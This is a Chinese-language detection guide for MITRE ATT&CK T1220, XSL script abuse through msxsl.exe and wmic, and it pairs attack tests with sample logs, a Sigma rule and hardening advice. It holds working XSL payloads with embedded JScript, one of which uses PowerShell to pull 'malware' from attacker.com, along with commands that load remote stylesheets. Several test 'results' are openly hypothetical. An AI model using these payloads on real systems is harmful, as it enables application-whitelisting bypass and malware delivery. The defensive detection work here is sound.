# T1220-Win-XSL脚本处理

## 描述

攻击者可能利用**可扩展样式表语言（XSL）**处理功能执行恶意代码，绕过应用程序白名单或安全控制（MITRE ATT&CK T1220）。XSL用于描述和渲染XML文件，支持嵌入脚本语言（如JavaScript、VBScript）以执行复杂操作。攻击者可通过微软的`msxsl.exe`工具或Windows管理工具（WMIC）调用XSL文件中的脚本，实现代码执行。

**msxsl.exe**是微软提供的命令行工具，用于处理XSL转换，接受XML源文件和XSL样式表作为参数。攻击者可利用其执行本地或远程的JavaScript/VBScript代码，绕过白名单限制，因为`msxsl.exe`是受信任的微软二进制文件。XSL文件本身是XML格式，允许攻击者使用相同文件作为XML和XSL参数，且文件扩展名可任意伪装（如`.jpeg`）。

另一种技术是**Squiblytwo**，利用`wmic.exe`通过XSL文件调用JScript/VBScript，支持本地或远程脚本执行，类似`regsvr32.exe`的代理执行行为。`wmic.exe`是Windows内置工具，增加攻击的隐蔽性。

此技术常用于规避防御机制，执行恶意载荷，如下载器、后门或凭据窃取脚本。

## 测试案例

### 测试1：使用msxsl.exe加载本地XSL脚本

攻击者使用`msxsl.exe`执行本地XML和XSL文件中的JavaScript代码，模拟恶意行为（如启动计算器）。

**环境要求**：
- 系统：Windows（测试环境未找到`msxsl.exe`下载地址，需手动获取）
- 工具：`msxsl.exe`（非Windows默认安装，可从微软或其他可信来源下载）
- 文件：`malicious.xml`和`malicious.xsl`（包含恶意JavaScript）

**攻击命令**：
```cmd
C:\Windows\Temp\msxsl.exe malicious.xml malicious.xsl
```

**示例XSL文件（malicious.xsl）**：
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <msxsl:script language="JScript" implements-prefix="user">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell");
      r.Run("calc.exe");
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <html><body><h1>Test</h1></body></html>
  </xsl:template>
</xsl:stylesheet>
```

**示例XML文件（malicious.xml）**：
```xml
<?xml version="1.0"?>
<root>Test</root>
```

**清理命令**：
```cmd
del malicious.xml malicious.xsl
taskkill /IM calc.exe /F
```

**说明**：
- `msxsl.exe`加载`malicious.xsl`中的JavaScript，执行`calc.exe`。
- 文件扩展名可伪装（如`.jpeg`），增加隐蔽性。

### 测试2：使用msxsl.exe加载远程XSL脚本

攻击者通过`msxsl.exe`从远程服务器加载XSL脚本执行恶意代码。

**攻击命令**：
```cmd
msxsl.exe http://attacker.com/malicious.xml http://attacker.com/malicious.xsl
```

**说明**：
- 需在攻击者控制的服务器上托管`malicious.xml`和`malicious.xsl`。
- 远程加载增加规避静态检测的可能性。

### 测试3：Squiblytwo使用wmic.exe加载XSL脚本

攻击者利用`wmic.exe`通过XSL文件执行远程或本地JScript/VBScript。

**本地攻击命令**：
```cmd
wmic process list /FORMAT:evil.xsl
```

**远程攻击命令**：
```cmd
wmic os get /FORMAT:"https://attacker.com/evil.xsl"
```

**示例XSL文件（evil.xsl）**：
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
  <msxsl:script language="JScript">
    <![CDATA[
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("powershell.exe -c Invoke-WebRequest -Uri http://attacker.com/malware -OutFile C:\\Temp\\malware.exe");
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <output>OK</output>
  </xsl:template>
</xsl:stylesheet>
```

**说明**：
- `wmic.exe`加载`evil.xsl`中的脚本，执行PowerShell下载恶意文件。
- 远程XSL加载可通过HTTPS隐藏流量。

## 检测日志

- **Windows安全日志**：
  - Event ID 4688：进程创建，记录`msxsl.exe`或`wmic.exe`的执行（需启用进程跟踪审核）。
- **Sysmon日志**：
  - Event ID 1：进程创建，捕获`msxsl.exe`或`wmic.exe`的命令行和父进程信息。
  - Event ID 3：网络连接，记录远程XSL文件加载（如HTTP/HTTPS请求）。
  - Event ID 7：镜像加载，检测脚本相关DLL（如`jscript.dll`）。
- **Windows系统日志**：可能记录异常服务或进程行为（如防病毒服务停止）。

## 测试复现

### 测试1：msxsl.exe本地文件加载

**测试环境**：Windows 10（未找到`msxsl.exe`下载地址，假设已获取）

**准备步骤**：
1. 准备`malicious.xml`和`malicious.xsl`（如上示例）。
2. 将`msxsl.exe`放置于`C:\Windows\Temp`。

**攻击命令**：
```cmd
C:\Windows\Temp\msxsl.exe malicious.xml malicious.xsl
```

**结果**（假设）：
- `calc.exe`启动，表明XSL中的JavaScript成功执行。
- 日志记录`msxsl.exe`进程创建。

**清理**：
```cmd
del C:\Windows\Temp\msxsl.exe malicious.xml malicious.xsl
taskkill /IM calc.exe /F
```

**说明**：测试未成功，因未获取`msxsl.exe`。

### 测试2：msxsl.exe远程文件加载

**攻击命令**：
```cmd
msxsl.exe http://snappyzz.com/malicious.xml http://snappyzz.com/malicious.xsl
```

**结果**（假设）：
- Word未安装，无法测试。
- 预期：`msxsl.exe`发起HTTP请求，下载并执行远程XSL脚本。

### 测试3：wmic.exe Squiblytwo

**攻击命令**：
```cmd
wmic process list /FORMAT:"C:\Temp\evil.xsl"
```

**结果**（假设）：
- `evil.xsl`中的PowerShell脚本执行，下载恶意文件。
- 日志记录`wmic.exe`进程和网络连接。

## 测试留痕

### Windows安全日志（Event ID 4688：进程创建）

```xml
日志名称: Security
来源: Microsoft-Windows-Security-Auditing
日期: 2023/10/01 10:00:00
事件 ID: 4688
任务类别: Process Creation
级别: 信息
用户: N/A
计算机: WIN10-TEST
描述:
已创建新进程。

创建者主题:
  安全 ID: WIN10-TEST\user
  帐户名: user
  帐户域: WIN10-TEST
  登录 ID: 0x12345

目标主题:
  安全 ID: NULL SID
  帐户名: -
  帐户域: -
  登录 ID: 0x0

进程信息:
  新进程 ID: 0x1a2b
  新进程名称: C:\Windows\Temp\msxsl.exe
  令牌提升类型: %%1938
  强制性标签: Mandatory Label\Medium Mandatory Level
  创建者进程 ID: 0x3c4d
  创建者进程名称: C:\Windows\System32\cmd.exe
  进程命令行: msxsl.exe malicious.xml malicious.xsl
```

**分析**：
- 日志记录`msxsl.exe`执行，命令行包含`.xml`和`.xsl`文件。
- 父进程为`cmd.exe`，提示通过命令提示符触发。

### Sysmon日志（Event ID 3：网络连接）

```xml
日志名称: Microsoft-Windows-Sysmon/Operational
来源: Microsoft-Windows-Sysmon
日期: 2023/10/01 10:00:00
事件 ID: 3
任务类别: Network connection detected
级别: 信息
用户: WIN10-TEST\user
计算机: WIN10-TEST
描述:
Network connection detected:
RuleName: technique_id=T1220,technique_name=XSL Script Processing
UtcTime: 2023-10-01 02:00:00.123
ProcessGuid: {12345678-1234-5678-1234-567890123456}
ProcessId: 1234
Image: C:\Windows\System32\wmic.exe
Protocol: tcp
DestinationIp: 192.168.1.100
DestinationPort: 443
DestinationHostname: attacker.com
```

**分析**：
- `wmic.exe`发起HTTPS连接，加载远程XSL文件。
- 网络活动与Squiblytwo技术相关。

## 检测规则/思路

### Sigma规则

```yaml
title: 检测msxsl.exe或wmic.exe执行XSL脚本
description: Detects execution of msxsl.exe or wmic.exe loading XSL scripts, potentially executing malicious JavaScript or VBScript.
status: experimental
date: 2023/10/01
references:
  - https://attack.mitre.org/techniques/T1220/
logsource:
  product: windows
  category: process_creation
detection:
  selection_msxsl:
    EventID:
      - 4688 # Windows安全日志
      - 1    # Sysmon日志
    Image|endswith: '\msxsl.exe'
    CommandLine|contains:
      - '.xsl'
      - '.xml'
      - 'http://'
      - 'https://'
  selection_wmic:
    EventID:
      - 4688
      - 1
    Image|endswith: '\wmic.exe'
    CommandLine|contains:
      - '/FORMAT:'
      - '.xsl'
      - 'http://'
      - 'https://'
  condition: selection_msxsl or selection_wmic
fields:
  - Image
  - CommandLine
  - ParentImage
falsepositives:
  - Legitimate use of msxsl.exe or wmic.exe for XSL processing
level: high
tags:
  - attack.execution
  - attack.t1220
```

**规则说明**：
- 检测`msxsl.exe`执行，命令行包含`.xsl`、`.xml`或URL。
- 检测`wmic.exe`执行，命令行包含`/FORMAT:`和`.xsl`或URL。
- 覆盖Windows安全日志（Event ID 4688）和Sysmon日志（Event ID 1）。
- 规则为实验性，需测试以减少合法XSL处理的误报。

### 建议

1. **监控代理执行工具**：
   - 使用Sysmon（Event ID 1）捕获`msxsl.exe`和`wmic.exe`的进程创建，检查命令行是否包含`.xsl`、`.xml`或URL。
   - 监控Event ID 3（网络连接），检测远程XSL文件加载。
   - 监控Event ID 7（镜像加载），检测脚本相关DLL（如`jscript.dll`、`vbscript.dll`）。

2. **启用命令行审计**：
   - 配置Windows安全策略，启用进程跟踪审核（Event ID 4688）并记录命令行参数。
   - 确保Sysmon配置捕获命令行和网络事件。

3. **基线化行为**：
   - 建立`msxsl.exe`和`wmic.exe`的正常使用基线，生产环境中`msxsl.exe`应罕见，`wmic.exe`加载XSL更不常见。
   - 监控非预期父进程（如`powershell.exe`）或异常参数（如URL）。

4. **限制工具使用**：
   - 使用AppLocker或组策略限制`msxsl.exe`和`wmic.exe`的执行，仅允许特定管理账户使用。
   - 禁用或移除非必要的`msxsl.exe`（若未默认安装）。

5. **部署SIEM系统**：
   - 使用SIEM工具（如Splunk、Elastic）分析安全日志和Sysmon日志，检测XSL脚本执行。
   - 设置高优先级告警，针对`msxsl.exe`或`wmic.exe`的异常行为。

6. **行为链关联**：
   - 将XSL脚本执行与其他可疑行为（如下载恶意文件、子进程创建）关联，识别攻击链。
   - 例如，检测`wmic.exe`加载XSL后是否执行PowerShell或下载器。

7. **网络防御**：
   - 配置防火墙阻止非必要出站连接（如`wmic.exe`的HTTPS请求）。
   - 监控异常域名或IP的HTTP/HTTPS流量。

8. **测试与验证**：
   - 在测试环境中模拟XSL脚本执行（如使用示例XSL文件），验证检测规则有效性。
   - 调整规则阈值，排除合法XSL处理的误报。

## 参考推荐

- MITRE ATT&CK T1220  
  <https://attack.mitre.org/techniques/T1220/>
- 跟着ATT&CK学安全之Defense Evasion  
  <https://snappyjack.github.io/articles/2020-01/跟着ATT&CK学安全之defense-evasion>
- Atomic Red Team T1220  
  <https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md>
- Microsoft文档：msxsl.exe  
  <https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms759854(v=vs.85)>
